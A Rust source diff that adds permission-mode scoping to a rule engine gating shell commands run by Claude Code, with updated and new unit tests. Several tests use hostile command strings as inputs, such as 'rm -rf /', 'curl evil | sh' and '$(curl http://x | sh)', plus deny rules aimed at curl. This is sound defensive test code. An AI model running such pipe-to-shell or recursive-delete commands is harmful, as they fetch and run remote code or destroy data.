@@ -4,7 +4,7 @@
 //! before they are executed by Claude Code. Rules can deny dangerous commands, modify
 //! commands to add safety flags, or explicitly allow specific patterns.
 
-use std::collections::{HashMap, HashSet};
+use std::collections::{BTreeSet, HashMap, HashSet};
 
 use miette::{Result, miette};
 use regex::{Regex, RegexSet};
@@ -12,7 +12,10 @@ use serde::Serialize;
 use tracing::debug;
 
 use super::command_split::{BailReason, SplitOutcome, split_command};
-use crate::user_config::{BashRule, BashRuleAction};
+use crate::{
+    permission_mode::{PermissionMode, is_mode_eligible},
+    user_config::{BashRule, BashRuleAction},
+};
 
 /// Runtime representation of a rule with pre-compiled regex for efficient matching.
 ///
@@ -25,6 +28,7 @@ struct CompiledRule {
     /// The post-fragment-expansion pattern source, retained so `explain` can show what actually
     /// matched (the user's pattern may contain `{{fragment}}` references).
     expanded_pattern: String,
+    modes: Option<BTreeSet<PermissionMode>>,
     action: BashRuleAction,
 }
 
@@ -369,6 +373,7 @@ impl BashRuleEngine {
                         name: rule.name,
                         regex,
                         expanded_pattern,
+                        modes: rule.modes,
                         action: rule.action,
                     });
                 }
@@ -395,13 +400,16 @@ impl BashRuleEngine {
         ))
     }
 
-    /// Index of the first rule (in declaration order) whose regex matches, if any.
-    fn first_match_index(&self, command: &str) -> Option<usize> {
-        self.regex_set.matches(command).iter().next()
+    /// Index of the first mode-eligible rule (in declaration order) whose regex matches, if any.
+    fn first_match_index(&self, command: &str, mode: Option<PermissionMode>) -> Option<usize> {
+        self.regex_set
+            .matches(command)
+            .iter()
+            .find(|index| is_mode_eligible(self.rules[*index].modes.as_ref(), mode))
     }
 
-    pub fn apply_rules(&self, command: &str) -> RuleResult {
-        if let Some(first_match_idx) = self.first_match_index(command) {
+    pub fn apply_rules(&self, command: &str, mode: Option<PermissionMode>) -> RuleResult {
+        if let Some(first_match_idx) = self.first_match_index(command, mode) {
             let rule = &self.rules[first_match_idx];
 
             debug!(
@@ -495,14 +503,19 @@ impl BashRuleEngine {
     /// green-light it. When the command cannot be analyzed, only an explicit Deny is honored; every
     /// other decision becomes a prompt. `cwd` drives in-cwd absolute-path normalization (see
     /// [`split_command`]).
-    pub fn apply_rules_compound(&self, command: &str, cwd: &str) -> RuleResult {
+    pub fn apply_rules_compound(
+        &self,
+        command: &str,
+        cwd: &str,
+        mode: Option<PermissionMode>,
+    ) -> RuleResult {
         match split_command(command, cwd) {
-            SplitOutcome::Bail(_) => downgrade_non_deny_to_ask(self.apply_rules(command)),
+            SplitOutcome::Bail(_) => downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
             SplitOutcome::Commands(leaves) => merge_results(
                 leaves
                     .iter()
                     .map(|leaf| {
-                        let result = self.apply_rules(&leaf.text);
+                        let result = self.apply_rules(&leaf.text, mode);
                         if leaf.real_file_write {
                             cap_allow_at_ask(result)
                         } else {
@@ -517,13 +530,18 @@ impl BashRuleEngine {
     /// Produces a full trace of how [`Self::apply_rules_compound`] evaluates `command`: the leaf
     /// split, each leaf's normalized text and matching rule, and the merged final decision. Used by
     /// `moriarty test bash-rules --explain`; the result mirrors `apply_rules_compound` exactly.
-    pub(crate) fn explain(&self, command: &str, cwd: &str) -> CommandTrace {
+    pub(crate) fn explain(
+        &self,
+        command: &str,
+        cwd: &str,
+        mode: Option<PermissionMode>,
+    ) -> CommandTrace {
         match split_command(command, cwd) {
             SplitOutcome::Bail(reason) => CommandTrace {
                 original: command.to_string(),
                 sub_commands: Vec::new(),
                 bail: Some(reason),
-                final_result: downgrade_non_deny_to_ask(self.apply_rules(command)),
+                final_result: downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
             },
             SplitOutcome::Commands(leaves) => {
                 // A second split without cwd recovers the pre-normalization leaf text for display.
@@ -536,7 +554,7 @@ impl BashRuleEngine {
                 let mut sub_commands = Vec::with_capacity(leaves.len());
                 let mut results = Vec::with_capacity(leaves.len());
                 for (index, leaf) in leaves.iter().enumerate() {
-                    let result = self.apply_rules(&leaf.text);
+                    let result = self.apply_rules(&leaf.text, mode);
                     let final_for_leaf = if leaf.real_file_write {
                         cap_allow_at_ask(result)
                     } else {
@@ -548,7 +566,7 @@ impl BashRuleEngine {
                             .map_or_else(|| leaf.text.clone(), |original| original.text.clone()),
                         normalized: leaf.text.clone(),
                         real_file_write: leaf.real_file_write,
-                        matched: self.match_explanation(&leaf.text),
+                        matched: self.match_explanation(&leaf.text, mode),
                     });
                     results.push(final_for_leaf);
                 }
@@ -564,8 +582,12 @@ impl BashRuleEngine {
     }
 
     /// The first rule matching `command`, rendered for explain output.
-    fn match_explanation(&self, command: &str) -> Option<RuleMatchExplanation> {
-        let rule = &self.rules[self.first_match_index(command)?];
+    fn match_explanation(
+        &self,
+        command: &str,
+        mode: Option<PermissionMode>,
+    ) -> Option<RuleMatchExplanation> {
+        let rule = &self.rules[self.first_match_index(command, mode)?];
         Some(RuleMatchExplanation {
             rule_name: rule.name.clone(),
             expanded_pattern: rule.expanded_pattern.clone(),
@@ -822,6 +844,7 @@ mod tests {
         BashRule {
             name: name.to_string(),
             pattern: pattern.to_string(),
+            modes: None,
             action: BashRuleAction::Allow,
         }
     }
@@ -830,6 +853,7 @@ mod tests {
         BashRule {
             name: name.to_string(),
             pattern: pattern.to_string(),
+            modes: None,
             action: BashRuleAction::Deny {
                 value: reason.to_string(),
             },
@@ -840,6 +864,7 @@ mod tests {
         BashRule {
             name: name.to_string(),
             pattern: pattern.to_string(),
+            modes: None,
             action: BashRuleAction::Ask,
         }
     }
@@ -848,6 +873,7 @@ mod tests {
         BashRule {
             name: name.to_string(),
             pattern: pattern.to_string(),
+            modes: None,
             action: BashRuleAction::Modify {
                 value: replacement.to_string(),
             },
@@ -861,7 +887,7 @@ mod tests {
     #[test]
     fn test_empty_rules() {
         let engine = make_engine(vec![]);
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert_eq!(result, RuleResult::NoMatch);
     }
 
@@ -872,7 +898,7 @@ mod tests {
             r"^rm\s+-rf\s+/",
             "Dangerous recursive delete",
         )]);
-        let result = engine.apply_rules("rm -rf /");
+        let result = engine.apply_rules("rm -rf /", None);
 
         match result {
             RuleResult::Denied { rule_name, reason } => {
@@ -886,7 +912,7 @@ mod tests {
     #[test]
     fn test_allow_rule() {
         let engine = make_engine(vec![allow_rule("allow-ls", r"^ls($|\s)")]);
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert_eq!(
             result,
             RuleResult::Allowed {
@@ -898,7 +924,7 @@ mod tests {
     #[test]
     fn test_ask_rule() {
         let engine = make_engine(vec![ask_rule("ask-docker", r"^docker")]);
-        let result = engine.apply_rules("docker build");
+        let result = engine.apply_rules("docker build", None);
         assert_eq!(
             result,
             RuleResult::Asked {
@@ -914,7 +940,7 @@ mod tests {
             r"^(docker\s+system\s+prune)$",
             "$1 --dry-run",
         )]);
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
 
         match result {
             RuleResult::Modified {
@@ -935,7 +961,7 @@ mod tests {
             r"^echo\s+(\w+)\s+(\w+)$",
             "echo $2 $1",
         )]);
-        let result = engine.apply_rules("echo hello world");
+        let result = engine.apply_rules("echo hello world", None);
 
         match result {
             RuleResult::Modified {
@@ -956,7 +982,7 @@ mod tests {
             deny_rule("deny-all", r".*", "All commands denied"),
         ]);
 
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert_eq!(
             result,
             RuleResult::Allowed {
@@ -964,7 +990,7 @@ mod tests {
             }
         );
 
-        let result = engine.apply_rules("rm file.txt");
+        let result = engine.apply_rules("rm file.txt", None);
         match result {
             RuleResult::Denied { rule_name, .. } => {
                 assert_eq!(rule_name, "deny-all");
@@ -980,7 +1006,7 @@ mod tests {
             allow_rule("allow-all-docker", r"^docker"),
         ]);
 
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
         assert_eq!(
             result,
             RuleResult::Asked {
@@ -988,7 +1014,7 @@ mod tests {
             }
         );
 
-        let result = engine.apply_rules("docker build");
+        let result = engine.apply_rules("docker build", None);
         assert_eq!(
             result,
             RuleResult::Allowed {
@@ -1004,7 +1030,7 @@ mod tests {
             ask_rule("ask-specific", r"^docker\s+system\s+prune"),
             deny_rule("deny-all-docker", r"^docker", "Docker denied"),
         ]);
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
         assert_eq!(
             result,
             RuleResult::Asked {
@@ -1017,7 +1043,7 @@ mod tests {
             deny_rule("deny-all-docker", r"^docker", "Docker denied"),
             ask_rule("ask-specific", r"^docker\s+system\s+prune"),
         ]);
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
         match result {
             RuleResult::Denied { rule_name, reason } => {
                 assert_eq!(rule_name, "deny-all-docker");
@@ -1034,7 +1060,7 @@ mod tests {
             ask_rule("ask-specific", r"^docker\s+system\s+prune"),
             modify_rule("modify-all-docker", r"^(docker\s+.*)", "$1 --dry-run"),
         ]);
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
         assert_eq!(
             result,
             RuleResult::Asked {
@@ -1047,7 +1073,7 @@ mod tests {
             modify_rule("modify-all-docker", r"^(docker\s+.*)", "$1 --dry-run"),
             ask_rule("ask-specific", r"^docker\s+system\s+prune"),
         ]);
-        let result = engine.apply_rules("docker system prune");
+        let result = engine.apply_rules("docker system prune", None);
         match result {
             RuleResult::Modified {
                 rule_name,
@@ -1063,7 +1089,7 @@ mod tests {
     #[test]
     fn test_no_match() {
         let engine = make_engine(vec![deny_rule("deny-rm", r"^rm\s", "rm denied")]);
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert_eq!(result, RuleResult::NoMatch);
     }
 
@@ -1077,7 +1103,7 @@ mod tests {
         let engine = BashRuleEngine::from_config(rules, None)
             .expect("Should succeed, skipping invalid rules");
 
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert_eq!(
             result,
             RuleResult::Allowed {
@@ -1085,7 +1111,7 @@ mod tests {
             }
         );
 
-        let result = engine.apply_rules("rm file.txt");
+        let result = engine.apply_rules("rm file.txt", None);
         assert_eq!(result, RuleResult::NoMatch);
     }
 
@@ -1141,7 +1167,7 @@ mod tests {
     #[test]
     fn test_apply_rules_empty_command() {
         let engine = make_engine(vec![deny_rule("deny-all", r".*", "denied")]);
-        let result = engine.apply_rules("");
+        let result = engine.apply_rules("", None);
 
         match result {
             RuleResult::Denied { .. } => {}
@@ -1156,7 +1182,7 @@ mod tests {
             r"^\s+$",
             "whitespace only",
         )]);
-        let result = engine.apply_rules("   \t\n");
+        let result = engine.apply_rules("   \t\n", None);
 
         match result {
             RuleResult::Denied { reason, .. } => {
@@ -1169,7 +1195,7 @@ mod tests {
     #[test]
     fn test_apply_rules_no_match_on_whitespace() {
         let engine = make_engine(vec![allow_rule("match-non-whitespace", r"^\S+$")]);
-        let result = engine.apply_rules("   ");
+        let result = engine.apply_rules("   ", None);
         assert_eq!(result, RuleResult::NoMatch);
     }
 
@@ -1180,7 +1206,7 @@ mod tests {
             r"^(docker\s+\w+)",
             "$1 --flag",
         )]);
-        let result = engine.apply_rules("docker build");
+        let result = engine.apply_rules("docker build", None);
 
         match result {
             RuleResult::Modified { new_command, .. } => {
@@ -1197,7 +1223,7 @@ mod tests {
             allow_rule("generic-allow-rm", r"^rm"),
         ]);
 
-        let result = engine.apply_rules("rm -rf /");
+        let result = engine.apply_rules("rm -rf /", None);
 
         match result {
             RuleResult::Denied { rule_name, reason } => {
@@ -1217,7 +1243,7 @@ mod tests {
 
         let engine = make_engine(rules);
 
-        let result = engine.apply_rules("target-command");
+        let result = engine.apply_rules("target-command", None);
         match result {
             RuleResult::Denied { rule_name, .. } => {
                 assert_eq!(rule_name, "final-match");
@@ -1385,10 +1411,10 @@ mod tests {
         let rules = vec![allow_rule("allow-ls", "^ls{{safe}}*$")];
         let engine = BashRuleEngine::from_config(rules, Some(fragments)).unwrap();
 
-        let result = engine.apply_rules("ls -la");
+        let result = engine.apply_rules("ls -la", None);
         assert!(matches!(result, RuleResult::Allowed { .. }));
 
-        let result = engine.apply_rules("ls | grep foo");
+        let result = engine.apply_rules("ls | grep foo", None);
         assert!(matches!(result, RuleResult::NoMatch));
     }
 
@@ -1435,10 +1461,10 @@ mod tests {
         let rules = vec![allow_rule("test", "^{{safe_chars}}+$")];
         let engine = BashRuleEngine::from_config(rules, Some(user_fragments)).unwrap();
 
-        let result = engine.apply_rules("abc");
+        let result = engine.apply_rules("abc", None);
         assert!(matches!(result, RuleResult::Allowed { .. }));
 
-        let result = engine.apply_rules("ABC");
+        let result = engine.apply_rules("ABC", None);
         assert!(matches!(result, RuleResult::NoMatch));
     }
 
@@ -1454,7 +1480,7 @@ mod tests {
 
         let engine = BashRuleEngine::from_config(rules, Some(fragments)).unwrap();
 
-        let result = engine.apply_rules("abc");
+        let result = engine.apply_rules("abc", None);
         assert!(matches!(result, RuleResult::Allowed { .. }));
     }
 
@@ -1469,7 +1495,7 @@ mod tests {
             "$1 --dry-run",
         )];
         let engine = BashRuleEngine::from_config(rules, Some(fragments)).unwrap();
-        let result = engine.apply_rules("docker build");
+        let result = engine.apply_rules("docker build", None);
 
         match result {
             RuleResult::Modified { new_command, .. } => {
@@ -1796,6 +1822,7 @@ mod tests {
         let engine = make_engine(vec![BashRule {
             name: "filter-cargo-doc".to_string(),
             pattern: r"^cargo doc\b".to_string(),
+            modes: None,
             action: BashRuleAction::ArgumentFilter {
                 remove: Some(vec!["--open".to_string()]),
                 add: None,
@@ -1804,7 +1831,7 @@ mod tests {
             },
         }]);
 
-        let result = engine.apply_rules("cargo doc --open --no-deps");
+        let result = engine.apply_rules("cargo doc --open --no-deps", None);
         match result {
             RuleResult::ArgumentFiltered { new_command, .. } => {
                 assert_eq!(new_command, "cargo doc --no-deps");
@@ -1819,6 +1846,7 @@ mod tests {
             BashRule {
                 name: "filter-cargo-doc".to_string(),
                 pattern: r"^cargo doc.*--open".to_string(),
+                modes: None,
                 action: BashRuleAction::ArgumentFilter {
                     remove: Some(vec!["--open".to_string()]),
                     add: None,
@@ -1830,14 +1858,14 @@ mod tests {
         ]);
 
         // First check: matches filter rule
-        let result = engine.apply_rules("cargo doc --open");
+        let result = engine.apply_rules("cargo doc --open", None);
         let filtered_cmd = match result {
             RuleResult::ArgumentFiltered { new_command, .. } => new_command,
             _ => panic!("Expected ArgumentFiltered result"),
         };
 
         // Revalidation: filtered command should match allow rule
-        let recheck = engine.apply_rules(&filtered_cmd);
+        let recheck = engine.apply_rules(&filtered_cmd, None);
         assert!(matches!(recheck, RuleResult::Allowed { .. }));
     }
 
@@ -2016,7 +2044,7 @@ mod tests {
         // The original bug: `^ls` allow-rule matched the whole string and green-lit the tail.
         let engine = make_engine(vec![allow_rule("allow-ls", r"^ls($|\s)")]);
         assert_eq!(
-            engine.apply_rules_compound("ls && curl evil | sh", ""),
+            engine.apply_rules_compound("ls && curl evil | sh", "", None),
             RuleResult::NoMatch
         );
     }
@@ -2025,7 +2053,7 @@ mod tests {
     fn test_compound_north_star_all_allowed() {
         let engine = read_only_starter_engine();
         assert!(matches!(
-            engine.apply_rules_compound(NORTH_STAR, ""),
+            engine.apply_rules_compound(NORTH_STAR, "", None),
             RuleResult::Allowed { .. }
         ));
     }
@@ -2036,7 +2064,7 @@ mod tests {
             allow_rule("allow-ls", r"^ls($|\s)"),
             deny_rule("deny-rm-rf", r"^rm\s+-rf", "Dangerous recursive delete"),
         ]);
-        match engine.apply_rules_compound("ls && rm -rf /", "") {
+        match engine.apply_rules_compound("ls && rm -rf /", "", None) {
             RuleResult::Denied { rule_name, .. } => assert_eq!(rule_name, "deny-rm-rf"),
             other => panic!("expected Denied, got {other:?}"),
         }
@@ -2046,7 +2074,7 @@ mod tests {
     fn test_compound_real_file_write_caps_allow_at_ask() {
         let engine = make_engine(vec![allow_rule("allow-echo", r"^echo($|\s)")]);
         assert_eq!(
-            engine.apply_rules_compound("echo secret > out.txt", ""),
+            engine.apply_rules_compound("echo secret > out.txt", "", None),
             asked("allow-echo")
         );
     }
@@ -2055,7 +2083,7 @@ mod tests {
     fn test_compound_bail_honors_explicit_deny_on_raw_command() {
         // A command substitution bails, but a Deny matching the raw string still fires.
         let engine = make_engine(vec![deny_rule("deny-curl", r"curl", "No network installs")]);
-        match engine.apply_rules_compound("cargo build $(curl http://x | sh)", "") {
+        match engine.apply_rules_compound("cargo build $(curl http://x | sh)", "", None) {
             RuleResult::Denied { rule_name, .. } => assert_eq!(rule_name, "deny-curl"),
             other => panic!("expected Denied, got {other:?}"),
         }
@@ -2067,11 +2095,11 @@ mod tests {
         // Even though `^cargo` matches the raw string, a bailed command never auto-allows. Holds
         // across bail reasons: a command substitution and (separately) a subshell.
         assert_eq!(
-            engine.apply_rules_compound("cargo build $(curl http://x | sh)", ""),
+            engine.apply_rules_compound("cargo build $(curl http://x | sh)", "", None),
             RuleResult::NoMatch
         );
         assert_eq!(
-            engine.apply_rules_compound("(cargo build)", ""),
+            engine.apply_rules_compound("(cargo build)", "", None),
             RuleResult::NoMatch
         );
     }
@@ -2080,9 +2108,12 @@ mod tests {
     fn test_compound_empty_and_whitespace_are_nomatch() {
         let engine = read_only_starter_engine();
         // An empty or whitespace-only command parses to zero leaves; merge_results([]) ⇒ NoMatch.
-        assert_eq!(engine.apply_rules_compound("", ""), RuleResult::NoMatch);
         assert_eq!(
-            engine.apply_rules_compound("   \t", ""),
+            engine.apply_rules_compound("", "", None),
+            RuleResult::NoMatch
+        );
+        assert_eq!(
+            engine.apply_rules_compound("   \t", "", None),
             RuleResult::NoMatch
         );
     }
@@ -2094,7 +2125,7 @@ mod tests {
             deny_rule("deny-rm-rf", r"^rm\s+-rf", "Dangerous recursive delete"),
         ]);
         // The deny is neither the first nor the last leaf; it must still deny the whole command.
-        match engine.apply_rules_compound("echo a && rm -rf / && echo b", "") {
+        match engine.apply_rules_compound("echo a && rm -rf / && echo b", "", None) {
             RuleResult::Denied { rule_name, .. } => assert_eq!(rule_name, "deny-rm-rf"),
             other => panic!("expected Denied, got {other:?}"),
         }
@@ -2105,8 +2136,8 @@ mod tests {
         let engine = read_only_starter_engine();
         for command in ["ls -la", "cat Cargo.toml", "rm -rf /", "unknown-cmd"] {
             assert_eq!(
-                engine.apply_rules_compound(command, ""),
-                engine.apply_rules(command),
+                engine.apply_rules_compound(command, "", None),
+                engine.apply_rules(command, None),
                 "parity mismatch for {command:?}"
             );
         }
@@ -2117,7 +2148,7 @@ mod tests {
         // A relative-form allow-rule matches an in-cwd absolute path after normalization.
         let engine = make_engine(vec![allow_rule("allow-cat-src", r"^cat src/")]);
         assert_eq!(
-            engine.apply_rules_compound("cat /abs/cwd/src/lib.rs", "/abs/cwd"),
+            engine.apply_rules_compound("cat /abs/cwd/src/lib.rs", "/abs/cwd", None),
             allowed("allow-cat-src")
         );
     }
@@ -2135,7 +2166,7 @@ mod tests {
 
         // The valid rule still compiled and is enforced.
         assert!(matches!(
-            engine.apply_rules("ls -la"),
+            engine.apply_rules("ls -la", None),
             RuleResult::Allowed { .. }
         ));
 
@@ -2182,7 +2213,7 @@ mod tests {
     #[test]
     fn test_explain_traces_each_leaf_and_match() {
         let engine = read_only_starter_engine();
-        let trace = engine.explain("echo hi && ls -la", "");
+        let trace = engine.explain("echo hi && ls -la", "", None);
 
         assert!(trace.bail.is_none());
         assert_eq!(trace.sub_commands.len(), 2);
@@ -2203,7 +2234,7 @@ mod tests {
     #[test]
     fn test_explain_reports_bail_with_empty_leaves() {
         let engine = make_engine(vec![deny_rule("deny-curl", r"curl", "No network")]);
-        let trace = engine.explain("cargo build $(curl http://x | sh)", "");
+        let trace = engine.explain("cargo build $(curl http://x | sh)", "", None);
 
         assert!(matches!(trace.bail, Some(BailReason::CommandSubstitution)));
         assert!(trace.sub_commands.is_empty());
@@ -2214,12 +2245,91 @@ mod tests {
     #[test]
     fn test_explain_shows_original_and_normalized_text() {
         let engine = make_engine(vec![allow_rule("allow-cat-src", r"^cat src/")]);
-        let trace = engine.explain("cat /abs/cwd/src/lib.rs", "/abs/cwd");
+        let trace = engine.explain("cat /abs/cwd/src/lib.rs", "/abs/cwd", None);
 
         assert_eq!(trace.sub_commands.len(), 1);
         assert_eq!(trace.sub_commands[0].original, "cat /abs/cwd/src/lib.rs");
         assert_eq!(trace.sub_commands[0].normalized, "cat src/lib.rs");
         assert!(matches!(trace.final_result, RuleResult::Allowed { .. }));
+    }
+
+    #[test]
+    fn permission_modes_preserve_order_and_unrestricted_behavior() {
+        let mut plan_deny = deny_rule("plan-deny", r"^ls", "no ls in plan");
+        plan_deny.modes = Some(BTreeSet::from([PermissionMode::Plan]));
+        let mut default_allow = allow_rule("default-allow", r"^ls");
+        default_allow.modes = Some(BTreeSet::from([PermissionMode::Default]));
+        let fallback = ask_rule("fallback", r"^ls");
+        let engine = make_engine(vec![plan_deny, default_allow, fallback]);
+
+        assert!(matches!(
+            engine.apply_rules("ls", Some(PermissionMode::Plan)),
+            RuleResult::Denied { ref rule_name, .. } if rule_name == "plan-deny"
+        ));
+        assert_eq!(
+            engine.apply_rules("ls", Some(PermissionMode::Default)),
+            allowed("default-allow")
+        );
+        assert_eq!(
+            engine.apply_rules("ls", Some(PermissionMode::Auto)),
+            asked("fallback")
+        );
+        assert_eq!(engine.apply_rules("ls", None), asked("fallback"));
+
+        let unrestricted = make_engine(vec![allow_rule("all", r"^ls")]);
+        assert_eq!(unrestricted.apply_rules("ls", None), allowed("all"));
+        assert_eq!(
+            unrestricted.apply_rules("ls", Some(PermissionMode::Plan)),
+            allowed("all")
+        );
+    }
+
+    fn mode_sensitive_engine() -> BashRuleEngine {
+        let mut disabled = deny_rule("disabled", r"ls|curl", "disabled");
+        disabled.modes = Some(BTreeSet::new());
+        let mut plan_deny = deny_rule("plan-deny", r"ls|curl", "plan only");
+        plan_deny.modes = Some(BTreeSet::from([PermissionMode::Plan]));
+        make_engine(vec![
+            disabled,
+            plan_deny,
+            allow_rule("allow-echo", r"^echo"),
+        ])
+    }
+
+    #[test]
+    fn empty_mode_set_falls_through_during_compound_evaluation() {
+        let engine = mode_sensitive_engine();
+        let command = "echo hi && ls";
+        let plan_result = engine.apply_rules_compound(command, "", Some(PermissionMode::Plan));
+        assert!(matches!(
+            plan_result,
+            RuleResult::Denied { ref rule_name, .. } if rule_name == "plan-deny"
+        ));
+        assert_eq!(
+            engine
+                .explain(command, "", Some(PermissionMode::Plan))
+                .final_result,
+            plan_result
+        );
+        assert_eq!(
+            engine.apply_rules_compound(command, "", Some(PermissionMode::Default)),
+            RuleResult::NoMatch
+        );
+    }
+
+    #[test]
+    fn bailed_command_and_explanation_share_mode() {
+        let engine = mode_sensitive_engine();
+        let command = "echo $(curl x)";
+        for (mode, should_deny) in [
+            (Some(PermissionMode::Plan), true),
+            (Some(PermissionMode::Default), false),
+            (None, false),
+        ] {
+            let result = engine.apply_rules_compound(command, "", mode);
+            assert_eq!(engine.explain(command, "", mode).final_result, result);
+            assert_eq!(matches!(result, RuleResult::Denied { .. }), should_deny);
+        }
     }
 
     #[test]
@@ -2232,8 +2342,8 @@ mod tests {
             "cat $(x)",
         ] {
             assert_eq!(
-                engine.explain(command, "").final_result,
-                engine.apply_rules_compound(command, ""),
+                engine.explain(command, "", None).final_result,
+                engine.apply_rules_compound(command, "", None),
                 "explain/apply_rules_compound diverged for {command:?}"
             );
         }
@@ -2243,12 +2353,12 @@ mod tests {
         let deny_engine = make_engine(vec![deny_rule("deny-curl", r"curl", "No network")]);
         let bail_with_deny = "cargo build $(curl http://x | sh)";
         assert!(matches!(
-            deny_engine.apply_rules_compound(bail_with_deny, ""),
+            deny_engine.apply_rules_compound(bail_with_deny, "", None),
             RuleResult::Denied { .. }
         ));
         assert_eq!(
-            deny_engine.explain(bail_with_deny, "").final_result,
-            deny_engine.apply_rules_compound(bail_with_deny, ""),
+            deny_engine.explain(bail_with_deny, "", None).final_result,
+            deny_engine.apply_rules_compound(bail_with_deny, "", None),
         );
     }
 }
